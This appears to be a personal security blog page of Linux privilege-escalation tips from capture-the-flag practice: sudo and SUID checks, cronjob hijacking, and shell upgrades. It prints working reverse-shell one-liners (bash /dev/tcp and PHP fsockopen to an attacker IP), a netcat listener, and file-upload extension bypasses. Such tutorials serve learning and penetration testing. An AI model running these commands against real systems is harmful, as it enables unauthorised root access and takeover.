---
layout: page
title: Privilege Escalation
subtitle: The many different ways to escalate your privileges
image: /assets/fe.ico
description: The MANY different ways to escalate privileges
permalink: /tipsandtricks/privilegeescalation/
#hero_image: /assets/fe.ico
#hero_height: is-fullheight
---

# Introduction
Alrighty, so there's a lot that can be said here. I'm unsure how far into this I should go before I lose my mind alongside you, so this might be briefer than it could be. We'll see.
<br><br>
To better qualify the situation - privilege escalation implies you already have some type of access to a system, say through a basic end user that had a poor password. The following scenarios imply you already have a shell of some kind, and you are looking to further exploit that and get to the point where you are running the shell as an admin / root, or at least can execute commands as one.
<br><br><br>
# Let's start with sudo -l and SUID permissions
One of the go to commands once you've established yourself within a shell on a system is a quick `sudo -l`. It takes two seconds to type and another thirty seconds to check if anything from those results might be useful. What that does is list the commands that you can run as sudo, on a properly configured system this should be all but zero for normal users.
<br><br>
Let's say there is an improperly configured system that allows you to run `/usr/bin/less` with sudo rights. This could lead to you reading files that you should not have access to. The easiest way to discover if there is a way to exploit whatever is listed from the `sudo -l` command is to reference [gtfobins](https://gtfobins.github.io/). They have a _massive_ library of ways to bypass restrictions and escalate your privileges - their site will be referenced multiple times throughout my [CTF Exploits](/blog) page.
<br><br>
On a very similar note, we can use files that have the SUID permissions (can run files with the owner's privileges) to escalate our privileges. We can check what files like this exist by entering `find / -perm -u=s -type f 2>/dev/null`. This is very similar to any other find command, what this searches for are files that contain those SUID permissions. And again, if this returns you a list reference gtfobins for any known exploits from them.
<br><br><br>

# Uploading reverse tcp shells
There are numerous ways you can start a reverse shell, I've modified plugins for a blog, replaced a file that was used by a cronjob, there's a range of ways.
<br><br>
A great site for this is [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), as they offer some quick commands that, once edited for your IP address and port, can start those shells via bash, perl, python, php and other methods. They also have more material on that side beyond just how to start reverse shells, including stuff relating to SQL injection and more notes on John.
<br><br>
Back to the reverse shell side of things, let's use the example I mentioned with modifying the file used by the cronjob. Essentially I was able to edit in the following command to a cronjob that executed every minute, and what I appended to that file was the following:<br>
`bash -i >& /dev/tcp/10.18.91.219/8000 0>&1`<br><br>
While in another tab I had a netcat listener on that same port: `nc -lvnp 8000`
<br><br>
Basically what this two step process is saying is:<br>
- First, upload a reverse shell somehow, that will somehow be called (examples given here were as activated plugins or by a cronjob)
- And then second, you need to be listening on the same port that the reverse shell is trying to reach you at. When that command executes it will try to initiate that connection over port `8000` at my IP address of `10.18.91.219`. If I am not listening over that port I will miss the connection<br><br>

The other example was with the plugin, and although I forget exactly how it was worded, I do recall I was able to gain a foothold into their website editor and from there I could edit their plugins. I edited one of their already active plugins with something like:<br>
`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`<br><br>
And then curled the location for that specific php plugin, which started the reverse shell, and my netcat listener was already waiting.<br><br>

There are many different ways you can initiate that reverse shell, it all comes down to what you have access to, what you should modify, and your permissions for those files.
<br><br><br>

# Upgrading / starting shells
Sometimes you might find that you have established a shell to a machine, but it is not the best or maybe not as stable as you would like. Some simple ways to do this include through python and perl, although there are more.
<br><br>
With python that would be:<br>
`python -c 'import pty;pty.spawn("/bin/bash")'`<br>
This extends to v3.x as well. If you're unsure what is installed, run a quick `which python`.
<br><br>
Through perl:<br>
`perl -e 'exec "/bin/sh";'`
<br><br><br>

# Reoccuring jobs / tasks on machines
Also known as cronjobs, although there are different kinds. Sometimes these will run exploitable or editable tasks on a schedule. If you can find a way to change them directly or resources / modules they interact with, this can be yet another way to gain access to more information or escalate your access. On most linux distributions you will find this at `/etc/crontab`. You can access this with a text editor or with `crontab -e`, or use the `-l` flag instead to just view them.
<br><br><br>

# LinEnum
This is another tool that can be found on GitHub, and can provide useful information on a target machine if you can get the permissions needed to run it. It does a lot of the things that are mentioned on this page automatically and generates a report for you to view later. Once you are on the machine you can get the file via wget or curl to the `/tmp` directory and work from there. The bash file is located [here](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh).<br><br>
Note: You will likely need to `chmod +x` that file to give it executable permissions.
<br><br><br>

# Other
Anytime you can find ssh keys, grab 'em. Reference the [bruteforcing](/tipsandtricks/bruteforcing/) page for ways to crack those and use them to your advantage.
<br><br>
As mentioned before, sometimes gaining that next foothold includes uploading e.g. php files to start a reverse tcp shell with yourself. However, depending where you upload they might restrict you to only certain types of files, or disallow certain types of files. Some ways to _maybe_ get around this is capitilize letters like .Php or .phP instead of .php, maybe see if it'll accept a .phtml file, etc. You get the idea. Security controls are meant to secure something otherwise not secure (duh), but that doesn't mean they account for everything, even if that means something as simple as denying file types by certain extensions only.
<br>
